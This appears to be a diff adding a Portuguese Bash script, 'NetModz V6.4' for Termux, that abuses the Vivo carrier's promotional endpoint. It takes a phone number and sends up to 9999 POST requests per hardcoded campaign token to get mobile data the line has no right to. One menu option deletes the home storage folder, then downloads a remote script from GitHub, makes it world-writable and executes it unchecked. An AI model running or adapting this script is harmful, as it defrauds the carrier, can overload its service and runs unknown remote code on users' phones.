@@ -1,0 +1,116 @@
+tit=$"Versão Estavel NetModz V6.4 Creditos totais para @OMentalista e @John034"
+tokens=$(echo "03bc4539-13db-4045-9119-a937eb48d41d
+91e22bd5-7b79-4fef-8dfa-c40f1ff3736b
+f922b71c-8b48-4363-a9fd-74c0757c161d
+6f514795-cef4-4629-8cee-59cc9775538e
+6e7eb039-9816-4118-9c3b-bb906887722c
+4919b47c-f588-4e71-87e3-639b3af92e4d
+db6327ec-3ad5-46a4-881e-1deff71c879a
+6c360891-8ce5-45ba-a2c3-97e0a7139d99
+f79ae136-8dcd-40c5-8421-d1371c9e50d1
+02f76cd1-eead-44ff-88dd-aa69538c7aef")
+veri=$(echo -e "\e[01;37m Opção: \e[0m") # Opção:
+veri2=$(echo -e "\e[01;37m Número: \e[0m") # Número:
+veri3=$(echo -e "\e[01;37m Vezes: \e[0m") # Vezes:
+while :; do
+clear && echo -e $tit
+  echo -e "\e[01;37;41m             VIVO             \e[0m"; sleep .4; echo
+  echo -e "         ≡ \e[01;37mMenu v6.4\e[0m ≡"
+  echo -e " \e[00;31m══════════════\e[0m\e[01;37m\e[00;31m═══════════════\e[0m"
+  echo -e " \e[01;37m[1]\e[0m\e[01;33m(NEW) PEGAR INTERNET\e[0m\c"; echo -e "    \e[02;03;37m\e[0m"
+  echo -e " \e[01;37m[2]\e[0m\e[01;33m(NEW) DATAMI\e[0m\c"; echo -e "    \e[02;03;37m\e[0m"
+  echo -e " \e[01;37m[0]\e[0m\e[01;33mSAIR DO SCRIPT\e[0m\c"; echo -e "          \e[02;03;37m\e[0m"
+  echo -e " \e[00;31m═════════════════════════════\e[0m"
+  
+  read -n1 -p "$veri" verifica; echo
+    case $verifica in # case MENU
+    
+       1) while :; do
+           clear && echo -e $tit
+           echo -e "\e[01;37;41m           MÉTODO PADRÃO           \e[0m"; sleep .4; echo
+           qtdtokens=$(echo "$tokens"| wc -l)
+               echo -e "\e[01;37;41m Coloque DDD E Numero \e[0m"
+           while :; do
+           read -p "$veri2" NUMERO; sleep .5
+           limite=$(echo $NUMERO | wc -m)
+                  case $limite in
+                       12) break;;
+                        *) echo -e "\e[01;33m Por favor, coloque o número corretamente\e[0m"; sleep .2
+                  esac
+           done
+           clear && echo -e $tit
+           echo -e "\e[01;37;41m           MÉTODO PADRÃO           \e[0m"; sleep .4; echo
+           echo -e "\e[07;01;37;40m NUMERO \e[01;31;47m $NUMERO \e[0m"; sleep .5; echo
+              for o in $(seq $qtdtokens);
+                 do
+                  case $o in
+                  $qtdtokens) mssg=$(echo "");;
+                           *) mssg=$(echo "")
+                  esac
+           VEZES=9999
+           tokens1=("sed '"$o"p; d'")
+           tokens2=$(echo "$tokens" | eval $tokens1)
+           echo -e "\e[07;01;37;40m   T O K E N \e[01;36;40m $o \e[0m"
+           echo -e "\e[01;32m TOKEN \e[01;37m: \e[0m\e[01;04;37m$tokens2\e[0m"
+              for i in $(seq $VEZES);
+                 do
+           response=$(data=$"msisdn=55$NUMERO&campid=$tokens2&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess.php" && curl -s "$site" -d "$data")
+           grepi1=$(echo $response | grep -c "Not eligible")
+                 case $grepi1 in
+                      1) echo -e "\e[01;33m Método Bom! mas o chip não é elegivel a ele\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 25; echo; break;;
+                      *)
+                 esac
+           grepi2=$(echo $response | grep -c "packprovisionOK")
+                case $grepi2 in
+                     1) echo -e "\e[01;32m Internet Enviada\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 25;;
+                     *)
+                esac
+           grepi3=$(echo $response | grep -c "Invalid Campaign")
+                 case $grepi3 in
+                      1) echo -e "\e[01;33m Método inválido! Tente outro\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 25; echo; break;;
+                      *)
+                 esac
+           grepi4=$(echo $response | grep -c "Transaction limit exceeded")
+                 case $grepi4 in
+                      1) echo -e "\e[01;32m Servidor NetModz Lotado, Tentando Novamente!\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 25;;
+                      *)
+                 esac
+           grepi5=$(echo $response | grep -c "7x1 elegibility")
+                 case $grepi5 in
+                      1) echo -e "\e[01;32m Servidor NetModz Em Atualização.\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 25;;
+                      *)
+                 esac
+              done
+           done
+           echo -e "         ≡ \e[01;37mOPÇÕES\e[0m ≡"
+           echo -e "  \e[00;31m══════════════\e[0m\e[01;37m\e[00;31m═══════════════\e[0m"
+           echo -e "  \e[01;37m〘1〙\e[0m\e[01;33mREPETIR MÉTODO PADRÃO\e[0m\c"; echo -e "\e[02;03;37m\e[0m"
+           echo -e "  \e[00;31m══════════════\e[0m\e[01;37m\e[00;31m═══════════════\e[0m"
+           echo -e "  \e[01;37m『2』\e[0m\e[01;33mVOLTAR PARA O MENU\e[0m\c"; echo -e "\e[02;03;37m\e[0m"
+           echo -e "  \e[00;31m═════════════════════════════\e[0m"
+            while :; do
+             read -n1 -p "$veri" opc2; echo
+                 case $opc2 in
+                      1) break;;
+                      2) break;;
+                      
+                      *) echo -e "\e[01;37;41m Calma \e[0m"; sleep 1
+                 esac
+            done
+                 case $opc2 in
+                      2) break
+                 esac
+           done;;
+       
+       2) 
+      cd $HOME; rm -rf storage; termux-setup-storage ; curl -sO https://raw.githubusercontent.com/leitura/ospacotesmb/main/padrao && chmod 777 padrao && ./padrao
+       
+       9) tail -n +120 principal > principal1 && head -n +28 principal1 > principal2 && rm principal1 && chmod +x principal2 && break;;
+       0) rm principal2 > /dev/null 2>&1; echo -e "\e[01;37mBy: | @EhisOpeNer E @NetModz\e[0m"; echo -e "\e[01;33mPara iniciar novamente digite: netmodzvivo\e[0m"|pv -qL 20; break;;
+       *) echo -e "\e[01;37;41m Calma \e[0m"; sleep 1
+    esac # case MENU
+done # primeiro loop
+case $verifica in
+     9) ./principal2;;
+     0) exit
+esac
